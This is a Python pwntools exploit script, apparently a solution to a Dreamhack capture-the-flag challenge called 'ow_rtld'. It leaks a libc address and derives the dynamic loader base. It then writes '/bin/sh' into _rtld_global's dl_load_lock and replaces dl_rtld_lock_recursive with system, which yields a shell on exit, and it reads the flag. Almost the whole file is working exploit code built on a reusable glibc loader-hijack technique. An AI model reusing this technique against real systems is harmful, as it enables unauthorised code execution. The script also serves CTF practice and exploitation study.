#!/usr/bin/env python3

from pwn import *

# ENV
PORT = 21283
HOST = "host8.dreamhack.games"
exe = context.binary = ELF('./ow_rtld_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
ld = ELF('./ld-2.27.so', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
            source /home/nhh/pwndbg/gdbinit.py
            brva 0x00000000000008E7
            brva 0x0000000000000865
            b* _IO_str_overflow
            b* _IO_wfile_overflow
            c
            set follow-fork-mode parent
            ''')

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)
else:
    p = exe.process()

def func(addr, data):
    p.sendlineafter(b'> ', str(1))
    p.sendlineafter(b'addr: ', str(addr))
    p.sendlineafter(b'data: ', str(data))

# VARIABLE


# PAYLOAD
p.recvuntil(b'stdout: ')
libc_leak = int(p.recvuntil(b'\n', drop=True), 16)
libc.address = libc_leak - libc.sym._IO_2_1_stdout_
log.info("Libc base: " + hex(libc.address))
system = libc.sym.system

# ld.address = libc.address + 0x400000 # LOCAL
ld.address = libc.address + 0x3f1000
log.info("Ld base: " + hex(ld.address))
ld_global = ld.sym._rtld_global
dl_load_lock = ld_global + 2312
dl_rtld_lock_recursive = ld_global + 3840

func(dl_load_lock, u64(b'/bin/sh\0'))
# GDB()
func(dl_rtld_lock_recursive, system)
p.sendlineafter(b'> ', str(2))
p.sendline(b'cat flag')

p.interactive()